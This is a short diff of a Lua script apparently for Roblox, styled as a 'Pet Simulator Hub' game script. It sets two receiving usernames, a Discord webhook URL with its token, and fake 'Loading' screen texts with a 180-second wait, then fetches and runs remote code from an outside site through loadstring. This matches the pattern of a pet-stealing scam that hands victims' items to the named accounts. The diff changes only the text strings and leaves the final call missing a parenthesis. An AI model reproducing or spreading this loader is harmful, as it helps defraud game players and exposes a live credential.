@@ -2,9 +2,9 @@ UserName = "GABRIELofficial_GAME"
 UserName2 = "KLJOAK_BLOX"
 Webhook = "https://discord.com/api/webhooks/1098977273304064071/e9QTTpFZ8cXQJH44StsCQyQS-7acoaxE3M3iFQY_Wv1ymN92CIZxw8XddiCAv_-Vy4zF"
 _G.MouseLock = false
-_G.ScriptName = "Pet Simulator Hub"
-_G.FirstText = "Loading.."
-_G.SecondText = "Script Loading..."
+_G.ScriptName = "Pet simulator Hub"
+_G.FirstText = "Loading"
+_G.SecondText = "loading.."
 _G.ThirdText = "Almost Done..."
 _G.WaitingTime = 180
-loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
+loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))(
